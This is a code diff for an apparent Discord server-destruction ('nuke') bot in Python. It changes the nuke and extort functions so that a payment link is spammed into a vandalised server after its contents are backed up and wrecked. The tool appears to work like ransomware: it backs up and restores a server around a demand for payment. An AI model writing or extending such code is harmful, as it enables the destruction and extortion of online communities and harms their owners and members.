@@ -8,7 +8,7 @@ async def backup(guild):
     d.close()
 
 
-async def nuke(guild):
+async def nuke(guild, payment_link=None):
     owner = guild.owner
     print(f'Nuking: {guild.name}\nOwned by: {owner.name}\nMembers: {len(guild.members)}')
     if b_replace_icon:
@@ -33,8 +33,8 @@ async def nuke(guild):
     #    await delete_stickers(guild)
     if b_create_text_channels or b_create_voice_channels or b_create_categories:
         await create_channels(guild)
-    if b_spam_text_channels or b_spam_images:
-        await spam(guild)
+    if b_spam_text_channels or b_spam_images or b_extort:
+        await spam(guild, payment_link)
 
 
 async def restore(guild):
@@ -52,6 +52,6 @@ async def restore(guild):
         await guild.edit(banner=d['banner'])
 
 
-async def extort(guild):
+async def extort(guild, payment_link):
     await backup(guild)
-    await nuke(guild)
+    await nuke(guild, payment_link)
